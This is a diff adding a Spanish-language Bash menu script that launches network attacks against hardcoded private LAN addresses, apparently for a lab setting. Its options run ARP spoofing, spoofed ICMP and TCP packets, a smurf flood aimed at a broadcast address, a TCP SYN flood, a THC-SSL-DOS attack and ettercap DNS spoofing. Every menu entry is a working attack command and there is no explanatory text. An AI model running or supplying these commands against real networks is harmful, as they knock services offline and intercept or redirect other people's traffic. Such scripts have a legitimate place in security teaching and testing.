@@ -1,0 +1,59 @@
+﻿#! /bin/bash
+
+while [ "$salir" != "Si" ]
+do
+echo 
+echo
+echo a. ARP SPOOFING
+echo b. IP SPOOFING ICMP
+echo c. IP SPOOFING TCP
+echo d. SMURF
+echo e. TCP SYN FLOOD
+echo f. THC-SSL-DOS 
+echo g. DNS SPOOFING
+echo h. SALIR
+echo
+echo
+echo
+
+read eleccion 
+case $eleccion in 
+a) 
+	arpspoof -i eth1 -t 192.168.0.8 192.168.0.60
+;;
+
+b)
+	hping3 -1 192.168.0.8 -c 10
+;;
+
+c)
+	hping3 -S 192.168.0.8 -c 10
+;;
+
+d)
+	hping -1 --flood 192.168.0.8 -a 192.168.0.255
+;;
+
+e)
+	hping3 --syn -i u1 -S -p 80 192.168.0.8
+;;
+
+f)
+	thc-ssl-dos 192.168.0.9 --accept
+;;
+
+g)
+	ettercap -Tqi eth1 -P dns_spoof -M arp // //
+;;
+
+*) 
+	echo Esta no es ninguna opción válida, favor presionar una opción del menú.
+;;
+
+esac
+done
+ 	
+	
+	
+
+
